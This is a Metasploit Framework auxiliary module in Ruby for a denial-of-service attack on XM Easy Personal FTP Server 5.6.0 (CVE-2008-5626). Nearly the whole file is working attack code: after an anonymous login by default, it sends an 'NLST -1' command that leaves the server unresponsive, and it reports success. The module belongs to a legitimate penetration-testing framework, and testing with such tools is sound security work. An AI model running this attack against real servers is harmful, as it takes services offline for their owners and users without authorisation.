##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ftp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'XM Easy Personal FTP Server 5.6.0 NLST DoS',
			'Description'    => %q{
				This module is a port of shinnai's script.  You need
				a valid login, but even anonymous can do it as long
				as it has permission to call NLST.
			},
			'Author'         => 'kris katterjohn',
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2008-5626'],
					[ 'OSVDB', '50837'],
					[ 'EDB', '6741' ]
				],
			'DisclosureDate' => 'Oct 13 2008'))

		# They're required
		register_options([
			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
		])
	end

	def run
		return unless connect_login

		raw_send("NLST -1\r\n")

		disconnect

		print_status("OK, server may still be technically listening, but it won't respond")
	end
end
